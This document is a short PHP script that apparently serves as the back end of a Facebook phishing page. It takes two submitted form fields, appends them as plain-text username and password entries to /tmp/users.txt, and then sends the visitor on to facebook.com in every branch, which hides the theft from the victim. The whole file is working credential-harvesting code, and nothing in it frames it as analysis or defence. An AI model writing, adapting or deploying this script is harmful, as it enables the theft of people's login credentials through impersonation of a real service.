<?php
if(isset($_POST['field1']) && isset($_POST['field2'])) {
    $data = 'username: ' . $_POST['field1'] . ' password: ' . $_POST['field2'] . "\n";
    $ret = file_put_contents('/tmp/users.txt', $data, FILE_APPEND | LOCK_EX);
    if($ret === false) {
        header( 'Location: https://www.facebook.com/' );
    }
    else {
        header( 'Location: https://www.facebook.com/' );
    }
}
else {
   header( 'Location: https://www.facebook.com/' );
}
